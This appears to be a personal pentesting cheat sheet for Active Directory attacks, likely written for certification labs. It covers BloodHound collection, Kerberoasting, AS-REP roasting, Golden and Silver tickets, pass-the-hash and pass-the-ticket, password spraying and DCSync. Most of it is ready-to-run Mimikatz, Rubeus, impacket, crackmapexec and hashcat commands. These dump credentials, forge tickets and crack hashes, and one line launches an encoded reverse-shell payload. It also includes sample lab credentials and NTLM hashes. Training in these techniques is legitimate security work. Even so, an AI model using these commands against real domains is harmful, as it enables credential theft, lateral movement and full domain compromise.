Always Follow:
```
https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
```


**NTDS.DIT file** — The NTDS.DIT file is a database that stores Active Directory data, including the password hashes for all users in the domain by default its found in  `C:\Windows\NTDS\`


- BloodHound
```sh

powershell -ep bypass

Import-Module .\Sharphound.ps1

Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix "audit"

#OR 

sharphound.exe -c All --domain <domain> --zipfilename sharp.zip

#back to our attacker machine
#copy the zip file to the attacker machine
neo4j start

./Bloodhound

#drag and drop the zip 

```

### Kerboroasting 

the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN.
no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN. The service ticket is encrypted using the SPN's password hash.

SPN = Service Principal Name
- It’s basically a **unique identifier**  for a   **service** (like MSSQL, HTTP, CIFS, LDAP) to the user or computer account running it.


GetUserSPNs.py:

```sh
#Since our Kali machine is not joined to the domain, we also must provide domain user credentials to obtain the TGS-REP hash
	#we user a any domain user
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

#$krb5tgs$23$*iis_service$CORP.COM$corp.com/
#user iss_service 
```

With Rubeus:

```
.\Rubeus.exe kerberoast /outfile:hashes.kerb
```



Cracking with dictionary of passwords:

```
hashcat -m 13100 --force <TGSs_file> <wordlist>

john --format=krb5tgs --wordlist=<wordlist> <AS_REP_responses_file>
```

psexec 
```
impacket-psexec <domain_name>/<domain_user>@<domain_ip>
```

sql service account
```sh
impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.107.148 -windows-auth


	
```

### Golden Ticket
Golden Ticket attacks take advantage of a vulnerability in the Kerberos authentication protocol, which Microsoft has been using as its default authentication protocol ever since Windows 2000.

In a Golden Ticket attack, hackers bypass the KDC and create TGTs themselves to get access to various resources. To forge a TGT, hackers need four key pieces of information:

- The FQDN (Fully Qualified Domain Name) of the domain
- The SID (Security Identifier) of the domain
- The username of the account they want to impersonate
-  NTLM hash of the domain’s KDC service account (KRBTGT) to sign and encrypt them.

The NTLM hash of the **krbtgt** account can be obtained via the following methods: 

1. DCSync (Mimikatz)
2. LSA (Mimikatz)
3. Hashdump (Meterpreter)
4. NTDS.DIT
5. DCSync (Kiwi)

**whoami /user** command or with the use of **PsGetsid** utility from [PsTools](https://download.sysinternals.com/files/PSTools.zip).

```sh
#Dump the sid and hash of krbtgt
lsadump::lsa /inject /name:krbtgt


#using  dcsync
lsadump::dcsync /user:krbtgt

#Metasploit could be an option

#Forge Golden ticket can be created with Mimikatz
kerberos::golden /user: /domain: /sid: /krbtgt: /id: 
```

**Note**: you may need to change the “ /Krbtgt:” to “/rc4:”. if you encountered any errors follow this official guide.

Shell access to the domain controller is also possible with the use of the **PsExec** utility.
### ASREPRoast

ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**

**NOTE** we cant pass this hash if we cant crack it its a deadEND

Kerbrute
```
kerbrute userenum --dc spookysec.local -d spookysec.local users.txt --downgrade
```

GetNPUsers to check for non preauth users 
```sh

#output hash
impacket-getnpusers oscp.lab/wade -outputfile bernie.asrep

Impacket-GetNPUsers -dc-ip <ip> -usersfile users.txt 
<domain_name/domain_user>

#if we are in the domain 
impacket-getnpusers oscp.lab/wade




```

With Rubeus:

```sh
# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast /outfile:<Out>
```

Cracking with dictionary of hash to recover the password :

```sh
hashcat -m 18200 -a 0 <AS_Response_Hash> <wordlist> --force
```


**note**

we can use PowerView's _Get-DomainUser_ function with the option **-PreauthNotRequired** on Windows
### Silver ticket

A **forged Kerberos service ticket** for a specific service (like file sharing, HTTP, etc.)

### Pass The Hash

If you can’t access the KRBTGT account,

we can steal an account’s **NTLM password hash** and uses that hash directly to authenticate to other machines/services that accept NTLM, without knowing the plaintext password.


This requires:

1. **Privilege Level System**: You will need system privileges to perform the attack.
2. **NTLM Password Hash of the Account You Want to Emulate**: The NTLM hash of the target account.
3. **Enabled NTLM Authentication**: The server or service you are trying to access must allow NTLM authentication.

```sh
#Collect username  domain , ntlm hash that we would use

sekurlsa::logonpasswords 

#Perform the Attack

sekurlsa::pth /user: /domain: /rc4: 

#Add /imporsonate To create a token in the current  or /run for specific Commnands

#One Line

mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```


```sh
impacket-wmiexec -hashes <hash> <user>@<ip>

crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

Invoke-WMIexec -Target <computer_name> -Username user -Hash <NTML_HASH>  -Command "powershell -e <reversehell_Base74>"

evil-winrm -i <IP> -u <user> -H <NTLM_hash> 

impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes <LM_HASH>:<NTLM_HASH> #replace LM hash with 32 0s
```
### Pass The Ticket

will load the Kerberos ticket from file `.kirbi` in memory and replays/uses it to access services as that user, bypassing needing the password

```
kerberos::ptt <ticket name>
```
### Harvest tickets from Windows

- Mimikatz 
- Rubeus

Rubeus is a tool specifically tailored for Kerberos interaction and manipulation. It's used for ticket extraction and handling, as well as other Kerberos-related activities.

```bash
# Dumping all tickets using Rubeus
.\Rubeus dump
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Listing all tickets
.\Rubeus.exe triage

# Dumping a specific ticket by LUID
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Renewing a ticket
.\Rubeus.exe renew /ticket:<BASE64_TICKET>

# Converting a ticket to hashcat format for offline cracking
.\Rubeus.exe hash /ticket:<BASE64_TICKET>
```

### Harvesting Tickets from Linux

Linux systems store credentials in three types of caches, namely **Files** (in `/tmp` directory), **Kernel Keyrings** (a special segment in the Linux kernel), and **Process Memory** (for single-process use). The **default_cache_name** variable is in `/etc/krb5.conf` that reveals the storage type in use, defaulting to `FILE:/tmp/krb5cc_%{uid}` if not specified.

Checkout
```
https://rp.os3.nl/2016-2017/p97/report.pdf
```

Automated Tools

`https://github.com/TarlogicSecurity/tickey`
### Password Spraying

check for  lockout threshold so we dont lock our account
```
net accounts
```

PowerShell script that enumerates all users and performs authentications according to the _Lockout threshold_ and _Lockout observation window_.

```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

**NXC**

```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

**Kerbrute**

```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
###  Over-Pass-the-Hash

An over-pass-the-hash attack involves extracting the targeted user’s Kerberos  account’s NT hash and uses that hash to embedding it in your session. This allows you to impersonate the targeted user and gain access to the resources they have rights to.

First, extract the Kerberos tickets from the compromised machine
```sh
sekurlsa::tickets /export

#PAss the ticket to our session
kerberos::ptt <ticket name>

#open cmd
misc::cmd

#Check if the kerb token is ready to use 
klist
```
### DcSync

Active Directory environments typically include multiple domain controllers, which needs to sync it could be simply a backup server. some applications, including Azure Active Directory Connect, need replication permissions. In a DCSync attack, a hacker who has gained access to a privileged account with grant a service account “Replicate Directory Changes All” this AD functionality by pretending to be a DC. DCSync is a mimikatz feature which will try to impersonate a domain controller and request account password information from the targeted domain controller


lsadump
```
lsadumnp::dcsync /domain:<domain_name> /user:krbtgt
```


secretsdump
```
secretsdump.py '<domain_name>'/'<domain_user>':'<domain_user_password>'@
'<domain_ip>'
```


**Access Account Methods**
psexec
```
psexec <domain_user>@<domain_ip> -hashes <user_hash>
```

OR

smbexec  
```
 smbexec <domain_user>@<domain_ip> -hashes <user_hash>
```

OR

wmiexec
```
wmiexec <domain_user>@<domain_ip> -hashes <user_hash>
```


### References

- https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87
- https://medium.com/@redfanatic7/detailed-mimikatz-guide-87176fd526c0
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.html#harvesting-tickets-from-linux